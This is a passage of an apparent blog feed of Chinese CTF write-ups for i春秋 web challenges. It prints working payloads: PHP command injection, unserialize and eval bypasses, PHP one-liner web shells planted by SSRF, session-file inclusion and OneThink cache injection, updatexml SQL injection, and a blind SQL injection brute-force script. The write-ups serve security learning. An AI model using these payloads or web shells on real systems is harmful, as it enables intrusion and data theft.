<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h5><p><a href="http://php.net/manual/en/function.shell-exec.php"><code>shell_exec()</code></a> 函数可通过 shell 环境执行命令，并返回所有执行结果，本函数功能与执行运算符相同。</p>
<p>因此，构造 payload </p>
<pre><code>hello=);echo shell_exec("cat flag.php");//</code></pre>
<p>在网页源代码处即可看到 flag</p>
<h5 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h5><p><a href="http://php.net/manual/en/function.passthru.php"><code>passthru()</code></a> 函数用于执行外部函数，并输出原始执行结果，没有返回值。</p>
<p>因此，构造 payload </p>
<pre><code>hello=);echo passthru("cat flag.php");//</code></pre>
<p>在网页源代码处即可看到 flag</p>
<h5 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h5><p><a href="http://php.net/manual/en/function.popen.php"><code>popen()</code></a> 函数用于创建指向命令执行进程的文件句柄，与 <code>fopen()</code> 函数类似，最后将通过 <code>fread()</code> 函数读取命令执行的结果。</p>
<p>因此，构造 payload </p>
<p>hello=);echo fread(popen(“cat flag.php”,”r”),100);//</p>
<p>在网页源代码处即可看到 flag：</p>
<h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h2><pre><code>&lt;?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}
if($_SESSION['time']+120&lt;time()){
  session_destroy();
}
$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];
if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}
if($_SESSION['nums']&gt;=10){
  echo $flag;
}
show_source(__FILE__);
?&gt;</code></pre>
<h4 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h4><p>这个真的是爆破。</p>
<h4 id="审计代码："><a href="#审计代码：" class="headerlink" title="审计代码："></a>审计代码：</h4><p>1、Session中的num初始值为0，time为当前时间，whoami初始值为ea。<br>2、120秒之后会话结束。然后str_rands随机生成2个字母。<br>3、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++。<br>4、whoami=str_rands，循环10次后，输出flag。</p>
<p>所以只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag。</p>
<pre><code>import requests

url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=ea"
al = ['abcdefghijklmnopqrstuvwxyz']
s = requests.session()
r=s.get(url)

for i in range(20):
    url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=" + r.content[0:2]
    r=s.get(url)
    print r.content</code></pre>
<p>或者：</p>
<p>?value[0]=e&amp;value[1]=a</p>
<p>会返回两个字符 假设是bq   那就  ?value[0]=b&amp;value[1]=q  代码主要是要验证这两个字符MD5的第五还是第六位是不是字符（弱类型可以过”==”号）或 0，写脚本的话注意session开启和重置</p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-EXEC</title>
    <url>/2021/05/01/i-chun-qiu-web-exec/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/leixiao-/p/9786320.html">https://www.cnblogs.com/leixiao-/p/9786320.html</a></p>
<p>还没学linux过后来做</p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-GetFlag</title>
    <url>/2021/04/26/i-chun-qiu-web-getflag/</url>
    <content><![CDATA[<p><img src="/2021/04/26/i-chun-qiu-web-getflag/28b861406b7c468016908395617f090.png" alt="28b861406b7c468016908395617f090">别人写的脚本：</p>
<pre><code>import requests
import base64
import sys
import hashlib

def getMd5(index):
    for i in range(100000,100000000):
        x = i
        md5 = hashlib.md5(str(x).encode("utf8")).hexdigest()
        if md5[0:6] == index:
            return x;
print(getMd5("3aab4a"))</code></pre>
<p>6516624</p>
<p><img src="/2021/04/26/i-chun-qiu-web-getflag/18165af35577bc59c5fd95424960aff.png" alt="18165af35577bc59c5fd95424960aff"></p>
<p>a.php</p>
<pre><code>&lt;?php
    echo "Do what you want to do, web dog, flag is in the web root dir";
?&gt;</code></pre>
<pre><code>?php
$f = $_POST['flag'];
$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '&gt;'), '', $f);
if((strlen($f) &gt; 13) || (false !== stripos($f, 'return')))
{
        die('wowwwwwwwwwwwwwwwwwwwwwwwww');
}
try
{
         eval("\$spaceone = $f");
}
catch (Exception $e)
{
        return false;
}
if ($spaceone === 'flag'){
    echo file_get_contents("helloctf.php");
}

?&gt;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20190615180605135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190615181130692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-Hash</title>
    <url>/2021/05/03/i-chun-qiu-web-hash/</url>
    <content><![CDATA[<p><img src="/2021/05/03/i-chun-qiu-web-hash/db497ae3ef59f08ca53247fcccdaf07.png" alt="db497ae3ef59f08ca53247fcccdaf07"></p>
<p>源代码中：$hash=md5($sign.$key);the length of $sign is 8</p>
<p>index.php?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p>
<p><img src="/2021/05/03/i-chun-qiu-web-hash/ad1712cf058b244469e8072040a775e.png" alt="ad1712cf058b244469e8072040a775e"></p>
<pre><code>&lt;?php 
class&nbsp;Demo&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; 

&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($file)&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;$file; 
&nbsp;&nbsp;&nbsp;&nbsp;} 

&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__destruct()&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;@highlight_file($this-&gt;file,&nbsp;true); 
&nbsp;&nbsp;&nbsp;&nbsp;} 

&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;__wakeup()&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;file&nbsp;!=&nbsp;'Gu3ss_m3_h2h2.php')&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//the&nbsp;secret&nbsp;is&nbsp;in&nbsp;the&nbsp;f15g_1s_here.php 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;file&nbsp;=&nbsp;'Gu3ss_m3_h2h2.php'; 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} 
&nbsp;&nbsp;&nbsp;&nbsp;} 
} 

if&nbsp;(isset($_GET['var']))&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;$var&nbsp;=&nbsp;base64_decode($_GET['var']); 
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(preg_match('/[oc]:\d+:/i',&nbsp;$var))&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die('stop&nbsp;hacking!'); 
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{ 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@unserialize($var); 
&nbsp;&nbsp;&nbsp;&nbsp;} 
}&nbsp;else&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;highlight_file("Gu3ss_m3_h2h2.php"); 
} 
?&gt; </code></pre>
<p>上脚本</p>
<pre><code>&lt;?phpclass Demo {
    private $file = 'Gu3ss_m3_h2h2.php';
    public function __construct($file) {
        $this-&gt;file = $file;
    }
    function __destruct() {
        echo @highlight_file($this-&gt;file, true);
    }
    function __wakeup() {
        if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this-&gt;file = 'Gu3ss_m3_h2h2.php';
        }
    }}$a = new Demo('f15g_1s_here.php');$s = serialize($a);echo $s;echo '&lt;br&gt;';$s = str_replace('O:4', 'O:+4',$s);//绕过正则$s = str_replace(':1:', ':2:' ,$s);//绕过wakeup函数echo base64_encode($s);//最后base64编码?&gt;</code></pre>
<pre><code>Gu3ss_m3_h2h2.php?var=TzorNDoiRGVtbyI6ODp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</code></pre>
<p>下个界面：</p>
<pre><code>&lt;?php 
if&nbsp;(isset($_GET['val']))&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;$val&nbsp;=&nbsp;$_GET['val']; 
&nbsp;&nbsp;&nbsp;&nbsp;eval('$value="'&nbsp;.&nbsp;addslashes($val)&nbsp;.&nbsp;'";'); 
}&nbsp;else&nbsp;{ 
&nbsp;&nbsp;&nbsp;&nbsp;die('hahaha!'); 
} 

?&gt; </code></pre>
<p>再审计，如果存在GET传入的val就令变量val等于其，然后eval一段内容，内容具体组成是value的值连上val的addslashes转义字符串再连上;组成<br>很明显了，这里就要我们利用eval()来获取到flag<br>先试试f15g_1s_here.php?val=${eval(“echo ‘ls’ ;”)}<br>发现页面没有显示了就。。。。看来不能这样用，因为上面的提示中提到了addslashes转义，它会将我们的’”都进行转义所以就不能这么构造eval指令<br>这里使用url的GET传值来避免val中的’ls’被转义构造payload：<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>ls</code>;</p>
<p>查看到所有文件，再cat查看<br>Payload：<br>f15g_1s_here.php?val=${eval($_GET[a])}&amp;a=echo <code>cat True_F1ag_i3_Here_233.php</code>;<br>页面也没有回显，查看源码得到flag</p>
<p><img src="/2021/05/03/i-chun-qiu-web-hash/aee16a3bbadf0d90bd46e773cf55ede.png" alt="aee16a3bbadf0d90bd46e773cf55ede"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-Look</title>
    <url>/2021/06/01/i-chun-qiu-web-look/</url>
    <content><![CDATA[<p>扫后台发现vimnifo</p>
<p>![4fa0c3568642010563a1a97b9a258c9](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/d202b37f60f616720bfa4776b0687a4.png)</p>
<p>进入5211ec9dde53ee65bb02225117fba1e1.php.backup<del>~</del>得到备份文件</p>
<pre><code>&lt;?php
$con = mysql_connect('localhost','root','');
mysql_query("set names utf8");
mysql_select_db("ctf");
if($_SERVER["REMOTE_ADDR"]=='8.8.8.8'){
    $name = addslashes($_GET['usern3me']);
}
else{
    if(stripos($_GET['usern3me'],'Bctf2O16')!==false){
        $name = 'FUCK';
    }
    else{
        $name = addslashes($_GET['usern3me']);
    }
}
echo 'hello '.$name;
$sql = "select * from admin where name='$name'";
$result = mysql_query($sql);
$num = mysql_num_rows($result);
if($num&gt;0){
    echo '&lt;br&gt;next ***.php';
}
?&gt;</code></pre>
<p>代码审计：</p>
<p>根据题目的提示，我以为是宽字节注入，但是尝试之后发现不行。因为还是老老实实想办法绕过Bctf2O16的过滤。</p>
<pre><code>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。
可以看到大写O和Ö是相等的</code></pre>
<p>因此可以使用ç=c 或者ô=o</p>
<pre><code>5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bçtf2O16</code></pre>
<p><img src="/2021/06/01/i-chun-qiu-web-look/ea614e0bd60de72daf4d01f55faafec.png" alt="ea614e0bd60de72daf4d01f55faafec"></p>
<p>进入以后又是一段代码进行审计：</p>
<pre><code>&lt;?php
if(isset($_GET['path'])&nbsp;&amp;&amp;&nbsp;isset($_GET['filename'])){
&nbsp;&nbsp;&nbsp;&nbsp;$path&nbsp;=&nbsp;$_GET['path'];
&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;"upload/".$_GET['filename'];
}
else{
&nbsp;&nbsp;&nbsp;&nbsp;show_source(__FILE__);
&nbsp;&nbsp;&nbsp;&nbsp;exit();
}
if(strpos($name,'..')&nbsp;&gt;&nbsp;-1){
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'WTF';
&nbsp;&nbsp;&nbsp;&nbsp;exit();
}

if(strpos($path,'http://127.0.0.1/')&nbsp;===&nbsp;0){
&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($name,file_get_contents($path));
}
else{
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'path&nbsp;error';
}
?&gt;</code></pre>
<pre><code>?filename=1.php&amp;path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php eval($_POST[1]);?&gt;</code></pre>
<p>因为有两个file函数所以要在burp中将空格也就是%20再urlencode一次变为%2520解析是才会为空格</p>
<p>然后蚁剑简洁</p>
<pre><code>url/upload/1.php</code></pre>
<p><img src="/2021/06/01/i-chun-qiu-web-look/ea5f97eaa4a22d10417703d95d4f16d.png" alt="ea5f97eaa4a22d10417703d95d4f16d"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-HelloWorld</title>
    <url>/2021/05/19/i-chun-qiu-web-helloworld/</url>
    <content><![CDATA[<p><img src="https://www.freesion.com/images/522/35569c24a4261ead1f06bac02613ff22.png" alt="1"></p>
<p>存在.git源码泄露漏洞</p>
<p>git_extract扫描</p>
<p><img src="/2021/05/19/i-chun-qiu-web-helloworld/0dfe8fd56e7c7c21ac020942f1a6b7d.png" alt="0dfe8fd56e7c7c21ac020942f1a6b7d"></p>
<p><img src="/2021/05/19/i-chun-qiu-web-helloworld/9b14c5baec6fc17c25a290ec8e23502.png" alt="9b14c5baec6fc17c25a290ec8e23502"></p>
<p>把这两拉到beyond compare比较：</p>
<p><img src="/2021/05/19/i-chun-qiu-web-helloworld/444ef4ba783346a7c53ea45f728c4f5.png" alt="444ef4ba783346a7c53ea45f728c4f5"></p>
<p>不一样的地方为flag：</p>
<pre><code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></pre>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-NotFound</title>
    <url>/2021/04/25/i-chun-qiu-web-notfound/</url>
    <content><![CDATA[<h3 id="HTTP请求方法："><a href="#HTTP请求方法：" class="headerlink" title="HTTP请求方法："></a>HTTP请求方法：</h3><p>HTTP 定义了一组<strong>请求方法</strong>, 以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作. 虽然他们也可以是名词, 但这些请求方法有时被称为HTTP动词. 每一个请求方法都实现了不同的语义, 但一些共同的特征由一组共享：: 例如一个请求方法可以是 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/safe">safe</a>, <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Idempotent">idempotent</a>, 或 <a href="https://developer.mozilla.org/en-US/docs/Glossary/cacheable">cacheable (en-US)</a>.</p>
<ul>
<li><p><code>GET</code></p>
<p>GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.</p>
</li>
<li><p><code>HEAD</code></p>
<p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.</p>
</li>
<li><p><code>POST</code></p>
<p>POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用. </p>
</li>
<li><p><code>PUT</code></p>
<p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p>
</li>
<li><p><code>DELETE</code></p>
<p>DELETE方法删除指定的资源。</p>
</li>
<li><p><code>CONNECT</code></p>
<p>CONNECT方法建立一个到由目标资源标识的服务器的隧道。</p>
</li>
<li><p><code>OPTIONS</code></p>
<p>OPTIONS方法用于描述目标资源的通信选项。</p>
</li>
<li><p><code>TRACE</code></p>
<p>TRACE方法沿着到目标资源的路径执行一个消息环回测试。</p>
</li>
<li><p><code>PATCH</code></p>
<p>PATCH方法用于对资源应用部分修改。</p>
</li>
</ul>
<h3 id="Web-NotFound"><a href="#Web-NotFound" class="headerlink" title="Web-NotFound"></a>Web-NotFound</h3><p>这里修改为OPTIONS</p>
<p><img src="/2021/04/25/i-chun-qiu-web-notfound/%7BN4UJOM4%25A%5BAA7AMQB8I0PF.png" alt="img"></p>
<p>发现当http以options的形式进行请求时出现了文件查询的操作</p>
<p>去url中试试访问/1.php，结果not here plz trying，意思是不在这里，请尝试其他方法。</p>
<p>。。。。无果，在url中加入/?f=1.php试试，没什么显示，查源码，没东西，抓包</p>
<p><img src="/2021/04/25/i-chun-qiu-web-notfound/2.png" alt="2"></p>
<pre><code>?f=.htaccess</code></pre>
<p><img src="/2021/04/25/i-chun-qiu-web-notfound/3.png" alt="3"></p>
<p>访问网站：</p>
<p><img src="/2021/04/25/i-chun-qiu-web-notfound/4.png" alt="4"></p>
<p>所以这里抓包进行修改</p>
<p>先尝试传入本地ip：X-Forwarded-For:127.0.0.1（不行），他提示了我们XFF的。。。</p>
<p>所以这里还有一种方法client-ip:127.0.0.1</p>
<p><img src="/2021/04/25/i-chun-qiu-web-notfound/5.png" alt="5"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-Manager</title>
    <url>/2021/06/02/i-chun-qiu-web-manager/</url>
    <content><![CDATA[<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603184940414.png" alt="image-20210603184940414"></p>
<p>发现_nonce</p>
<p>扫描后台：</p>
<p>进入</p>
<pre><code>url/sources/login.js</code></pre>
<pre><code>$(document).keydown(function(e) {
    if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) {
        alert("Illegal character");
        return false;
    }
});

function getnonce() {
    var text = "";
    var possible = "0123456789abcdef";
    for (var i = 0; i &lt; 40; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
$('#submit').click(function() {
    this._nonce = getnonce();
});</code></pre>
<pre><code>url/sources/bootstrap.js</code></pre>
<pre><code>  $(document).on('click.bs.alert.data-api', dismiss, Alert.prototype.close)

}(jQuery);

function sign (data, key) {
    var privateKey
    var i, j
    var W = new Array(80)
    var A, B, C, D, E
    var H0 = 0x97B5D3F1
    var H1 = 0x1F3D5B79
    var H2 = 0x684A2C0E
    var H3 = 0xE0C2A486
    var H4 = 0x33221100
    var H5 = 0xF0F0F0F0
    var temp
    var _RSA = function (n, s) {
        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))
        return t4
    }
    var _Rot = function (val) {
        var str = ''
        var i
        var v
        for (i = 7; i &gt;= 0; i--) {
            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f
            str += v.toString(16)
        }
        return str
    }
    str = unescape(encodeURIComponent(key + data))
    var strLen = str.length
    var wordArray = []
    for (i = 0; i &lt; strLen - 3; i += 4) {
        j = str.charCodeAt(i) &lt;&lt; 24 |
            str.charCodeAt(i + 1) &lt;&lt; 16 |
            str.charCodeAt(i + 2) &lt;&lt; 8 |
            str.charCodeAt(i + 3)
        wordArray.push(j)
    }
    switch (strLen % 4) {
        case 0:
            i = 0x080000000
            break
        case 1:
            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000
            break
        case 2:
            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000
            break
        case 3:
            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |
                str.charCodeAt(strLen - 2) &lt;&lt; 16 |
                str.charCodeAt(strLen - 1) &lt;&lt;
            8 | 0x80
            break
    }
    wordArray.push(i)
    while ((wordArray.length % 16) !== 14) {
        wordArray.push(0)
    }
    wordArray.push(strLen &gt;&gt;&gt; 29)
    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)
    H0 ^= H5
    H1 ^= H5
    H2 ^= H5
    H3 ^= H5
    H4 ^= H5
    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) {
        for (i = 0; i &lt; 16; i++) {
            W[i] = wordArray[privateKey + i]
        }
        for (i = 16; i &lt;= 79; i++) {
            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)
        }
        A = H0
        B = H1
        C = H2
        D = H3
        E = H4
        for (i = 0; i &lt;= 19; i++) {
            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff
            E = D
            D = C
            C = _RSA(B, 30)
            B = A
            A = temp
        }
        for (i = 20; i &lt;= 39; i++) {
            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff
            E = D
            D = C
            C = _RSA(B, 30)
            B = A
            A = temp
        }
        for (i = 40; i &lt;= 59; i++) {
            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff
            E = D
            D = C
            C = _RSA(B, 30)
            B = A
            A = temp
        }
        for (i = 60; i &lt;= 79; i++) {
            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff
            E = D
            D = C
            C = _RSA(B, 30)
            B = A
            A = temp
        }
        H0 = (H0 + A) &amp; 0x0ffffffff
        H1 = (H1 + B) &amp; 0x0ffffffff
        H2 = (H2 + C) &amp; 0x0ffffffff
        H3 = (H3 + D) &amp; 0x0ffffffff
        H4 = (H4 + E) &amp; 0x0ffffffff
    }
    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)
    return temp.toLowerCase()

}


$(document).ready(function() {
    $("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {
        var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();
        var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();
        $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({
            type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',
            name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',
            value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")
        }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');
    });
});</code></pre>
<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603183639838.png" alt="image-20210603183639838"></p>
<p>这里是对于sign的调用和_nonce的形成</p>
<p>通过sign()函数可以得到key 和 data 拼接方式。<br> str = unescape(encodeURIComponent(key + data))</p>
<p>用脚本吧：</p>
<pre><code>import hashlib
import requests
url = "http://03581832d20d4ab59fe85fa2480f3ffce5f10e0fd8d040d7.changame.ichunqiu.com/login.php"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

suffix = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="

temp = ""

for i in range(1, 50):
    # 所有可见字符
    for j in range(32, 127):
        # 字段名包含特殊字符
        payload = "'or ascii(substr(`p@ssw0rd`,{},1)) = {}#".format(
            i, j)

        info = suffix + payload + "1"
        nonce = hashlib.sha1(info.encode("utf-8")).hexdigest()
        data = "username={}&amp;password=1&amp;submit=&amp;_nonce={}&amp;a={}".format(payload, nonce, "a" * 21000)

        r = requests.post(url, headers=headers, data=data)
        # 猜测成功的请求长度为782
        if "Incorrect password" in r.content.decode("utf-8"):
            temp += chr(j)
            print(temp)
            break</code></pre>
<pre><code>MyIchunq1uSuperL0ng&amp;&amp;SecurePa$$word</code></pre>
<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603190858995.png" alt="image-20210603190858995"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-Notebook</title>
    <url>/2021/06/03/i-chun-qiu-web-notebook/</url>
    <content><![CDATA[<p>tips： 文件包含phpinfo是不是有新的发现</p>
<p>打开f12获取到PHPSESSION为ei4obnmvtlkbt57muuj4kh6f92，但为文件时则为ei4obnmvtlkbt57muuj4kh6f92。</p>
<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195929708.png" alt="image-20210603195929708"></p>
<p>创建用户</p>
<pre><code>&lt;?php @eval($_POST[cmd]);?&gt;</code></pre>
<p>登录</p>
<p>访问：</p>
<pre><code>http://8232dd75fdf94633b62235ec0315dc5e619bd981bd404025.changame.ichunqiu.com/action.php?module=&amp;file=../../../tmp/SESS/sess_ei4obnmvtlkbt57muuj4kh6f92</code></pre>
<p>采用hackbar更改post数据</p>
<p>cmd之后的命令会被执行</p>
<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195017909.png" alt="image-20210603195017909"></p>
<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603194950513.png" alt="image-20210603194950513"></p>
<p>查看f12</p>
<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195255484.png" alt="image-20210603195255484"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-OneThink</title>
    <url>/2021/05/06/i-chun-qiu-web-onethink/</url>
    <content><![CDATA[<h2 id="OneThink1-0文件缓存漏洞利用"><a href="#OneThink1-0文件缓存漏洞利用" class="headerlink" title="OneThink1.0文件缓存漏洞利用"></a>OneThink1.0文件缓存漏洞利用</h2><p>首先利用该漏洞尝试执行phpinfo。<br> 注册用户<code>%0aphpinfo();#</code><br> 其中<code>%0a</code>是让用户名在缓存文件中以新的一行开始（前面分析代码时提到<code>$data</code>会和前面的<code>&lt;?phpn//</code>拼接，这里是防止被<code>//</code>注释），而#注释符则让之后序列化产生的字符失效，防止影响函数执行。</p>
<p>提交注册，通过Burpsuit进行拦截，这里将<code>%0a</code>进行url编码解码，成为换行符</p>
<p>将数据包放行后，用户注册成功，进入登录界面进行登录：</p>
<p>同样进行抓包拦截，修改%0a后放行：</p>
<p>payload用户登录成功，接下来访问缓存页面<br> 发现成功执行phpinfo()！</p>
<p>在本地搭建同样环境后测试，发现缓存文件中内容如下：</p>
<p>同样的方法向缓存文件中写入代码执行：</p>
<pre class=" language-v"><code class="language-v">%0a$a=$_GET[a];#
%0asystem($a);#</code></pre>
<p>参考:<a href="https://www.anquanke.com/post/id/152584">https://www.anquanke.com/post/id/152584</a></p>
<h2 id="实例-i春秋-Web-OneThink"><a href="#实例-i春秋-Web-OneThink" class="headerlink" title="实例:i春秋:Web-OneThink"></a>实例:i春秋:Web-OneThink</h2><ol>
<li>换行符的url编码是%0A；</li>
<li>onethink是一个CMS平台；</li>
<li>oneThink1.0存在一个把用户名缓存下来的漏洞，可以修改用户名为php代码进行执行；</li>
<li>phpinfo(); 输出php信息</li>
<li><code>system($_GET[cmd]);</code>，能执行传入的cmd命令，并且回显在响应中；</li>
</ol>
<p>注册用户名会被缓存进一个文件，然后注册一个一句话木马做用户名，访问缓存文件，就能成。</p>
<p>两个账号：</p>
<pre><code>%0a$a=$_GET[a];//  
%0aecho  `$a`;//     #(%0a是换行符的urlencode)</code></pre>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-SomeWords</title>
    <url>/2021/05/09/i-chun-qiu-web-somewords/</url>
    <content><![CDATA[<pre><code>?id=updatexml(1,concat(0x7e,(select f14g from f14g),0x7e),1)</code></pre>
<p><img src="/2021/05/09/i-chun-qiu-web-somewords/963b46e85a453e6499edcb91657d809.png" alt="963b46e85a453e6499edcb91657d809"></p>
<pre><code>?id=updatexml(1,concat(reverse((select f14g from f14g))),1)</code></pre>
<p><img src="/2021/05/09/i-chun-qiu-web-somewords/b0bd2a2425baa0205d9c8c18c6aeee6.png" alt="b0bd2a2425baa0205d9c8c18c6aeee6"></p>
]]></content>
      <tags>
        <tag>i春秋</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋:Web-SQLi</title>
    <url>/2021/06/07/i-chun-qiu-web-sqli/</url>
